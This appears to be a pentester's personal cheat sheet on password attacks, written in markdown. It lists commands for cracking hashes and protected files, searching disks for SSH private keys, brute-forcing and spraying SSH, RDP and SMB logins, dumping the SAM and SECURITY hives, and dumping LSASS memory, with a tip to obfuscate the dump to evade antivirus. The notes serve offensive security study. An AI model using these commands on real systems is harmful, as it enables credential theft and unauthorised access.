# Password Attacks 
```
# Links
    1. https://tldp.org/HOWTO/pdf/User-Authentication-HOWTO.pdf
    2. https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication


# Linux Auth
    1. /etc/shadow - stores encrypted passwords and can only be read by root 
    2. /etc/passwd - stores user information but not the password lmao 
    3. /etc/group - stores information about groups 

# Windows Auth
    1. LSA - subsystem that authenticates users and logs them into the computer 
    2. LSASS - security policy, user auth, security logs 
    3. SAM - database that stores users passwords (/etc/shadow) (Ether LM or NTLM Hash)A
    4. Credential Manager - stores user creds for further use 
        4a. PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
    5. NTDS - Database for DC's that stores User Accounts, Group Accounts, Computer accounts, policy

```

<br> 

### John The Ripper 
```
# Notes 
    1. cracked hashes go to ~/.john/john.pot
    2. Show progressw with "john --show"
    3. Find john scripts 
        3a. locate *2john*

# Single Crack Mode 
    1. john --format=<hash_type> <hash or file> 

# Wordlist mode 
    1. john --wordlist=<wordlist_file> --rules <hash_file>

# Incremental mode 
    1. Generates all possible combinations of characters, starting with a single character and incrementing with each iteration

# Cracking Secured Files 
    1. <tool> <file_to_crack> > file.hash
    2. Ex. pdf2john server_doc.pdf > server_doc.hash


```

<br>

### Hashcat
```
# Hashid 
    1. use hashid -m to show hashcat mode

# Rules 
    1. https://hashcat.net/wiki/doku.php?id=rule_based_attack
    2. best64.rule is favored 
    3. password generation tool
        3a. https://github.com/digininja/CeWL
    4. https://github.com/Mebus/cupp
```

<br>

### Cracking Protected Files 
```
# Find protected files 
    for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# Search for SSH keys since they all start with the same header 
    grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
    
# You can test if an SSH key is portected using ssh-keygen to read it
    ssh-keygen -yf ~/.ssh/id_rsa 

# John crack ssh key 
    1. ssh2john.py sshkey > output.hash
    2. john --wordlist=[] output.hash
    3. john ssh.hash --show 

```

<br>

### Cracking archived / ZIP files 
```
# Get list of compression ext
    1. curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt

# John
    1. zip2john 

# openssl can be used to password protect files 
    1. Run 'file' on the file to identify this

# Simple for loop to crack openssl protected file 
    1. for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

# Bitlocker (Windows, Full Disk Encryption feature) 
    1. bitlocker2john
    2. https://openwall.info/wiki/john/OpenCL-BitLocker
    3. Use 'dislocker' to mount the drive to linux systems
        3a. sudo mkdir -p /media/bitlocker
        3b. sudo mkdir -p /media/bitlockermount 
        3c. sudo losetup -f -P Backup.vhd
            3ci. sudo fdisk -l
        3d. sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
        3d. sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
        3e. cd /media/bitlocker/

```

<br> 

### Networking Services 
```
# NetExec for password attacks 
    # Supports: {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}

    # Generic cmdline 
    - netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>


# Evil WinRM 
    - evil-winrm -i <target-IP> -u <username> -p <password>


# Hydra - Brute force ssh  
    - hydra -L user.list -P password.list ssh://[ip]


# RDP - Hydra 
    - hydra -L user.list -P password.list rdp://[ip]


# SMB (Client Server Data Transfer) 
    Hydra: hydra -L user.list -P password.list smb://[ip]

    Metasploit: use auxiliary/scanner/smb/smb_login

    Netexec: netexec smb [ip] -u "user" -p "password" --shares

    # Use SMB Client to communicate with the shares once you have creds 
    smbclient -U user \\\\[ip]\\SHARENAME

```


### Attacking SAM, SYSTEM, & SECURITY 
```
# Regsitry Hives 
    1. SAM: Hashes of user accounts 
    2. SYSTEM: system boot key, which can decrypt the hashes 
    3. SECURITY: inforamtion used by LSA, cached domain creds, cleartext passwords, DPAPI Keys 
        3a. DPAPI: Data Protection Application Programming Interface

# Copy Regsitry Hives useing reg.exe
    1. reg.exe save hklm\sam C:\sam.save
    2. Repeat for SYSTEM and SECURITY 

# Transfer back to host using smbserver
    1. sudo python3 smbserver.py -smb2support CompData ~
    2. From target machine: move file \\[host ip]\dir

# Dump Hashes using secretsdump
    1. python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# NOTE: Defending against Cred Dumping 
    1. https://attack.mitre.org/techniques/T1003/002/

# Extract LSA secrets from servcies, tasks, and applications (Using cracks creds)
    1. netexec smb [ip] --local-auth -u bob -p [pass] --lsa

# netexec to dump SAM 
    1. netexec smb [ip] --local-auth -u bob -p [pass] --sam
```

<br> 

### Password Spraying, stuffing, and defaults 
```
# netexec 
    1. netexec smb [ip]/24 -u list -p 'password' 


# Stuffing (Reusing creds from one service on another 
    1. hydra -c username_and_password.list ssh:[ip]

# Default creds 
    1. ~/tools/default creds
    2. source bin/activate
    3. creds search ****
```

<br> 

# Breaking LSASS
```
# Get a memory dump to attack LSASS. If we get it off the system we make less noise. 
# One way to do this is to use task manager 
    1. Task Manager 
    2. Process Tab
    3. Local Securit Authority Process 
    4. Create Dump File 

# Another way is to use rundll32.exe
    1. First find the PID
        1a. tasklist /scv
        1b. get lsass PID
        1c. Or use powershell Get-Process lsass
    2. rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
    3. Note this is noisy and will be picked up by an AV. Find a way to obfuscate it 

# Find users creds in the dump using pypykatz (Python version of Mimikatz)
    1. pypykatz lsa minidump /path/lsass.dmp

# Crack the dumped Hashes 
```

<br>

#
